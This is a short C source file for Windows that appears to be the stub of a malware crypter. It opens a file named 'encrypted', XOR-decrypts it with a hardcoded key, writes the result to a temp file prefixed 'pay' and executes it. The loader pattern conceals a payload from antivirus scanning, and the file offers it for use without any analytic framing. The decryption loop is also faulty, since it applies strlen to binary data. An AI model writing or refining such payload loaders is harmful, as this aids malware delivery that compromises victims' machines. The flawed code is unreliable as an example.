#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#define KEY "6969"
#define KEY_LENGTH 4
#define ENCRYPTED_FILE_PATH "encrypted"

void DecryptXOR(unsigned char data[], const char *key, const int key_length);

int main(int argc, char **argv)
{
    HANDLE encrypted_file = CreateFileA(ENCRYPTED_FILE_PATH, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (encrypted_file == INVALID_HANDLE_VALUE) {
        MessageBoxA(NULL, "Error opening encrypted file in stub.c", "Error", MB_ICONERROR);
        return 1;
    }

    const unsigned long file_size = GetFileSize(encrypted_file, NULL);
    char encrypted_buffer[file_size];
    unsigned long bytes_read;
    
    ReadFile(encrypted_file, encrypted_buffer, file_size, &bytes_read, NULL);
    CloseHandle(encrypted_file);

    DecryptXOR(encrypted_buffer, KEY, KEY_LENGTH);

    /* Save decrypted file in a temp file */
    char temp_path[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_path);
    char temp_file[MAX_PATH];
    GetTempFileNameA(temp_path, "pay", 0, temp_file);

    HANDLE temp_file_handle = CreateFileA(temp_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(temp_file_handle, encrypted_buffer, file_size, &bytes_read, NULL);
    CloseHandle(temp_file_handle);

    /* Execute decrypted file */
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (!CreateProcessA(temp_file, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        MessageBoxA(NULL, "Could not execute the decrypted file", "Error", MB_ICONERROR);
        return 1;
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}

void DecryptXOR(unsigned char data[], const char *key, const int key_length)
{
    for (int i = 0; i < strlen(data); ++i) {
        data[i] ^= key[i % key_length];
    }
}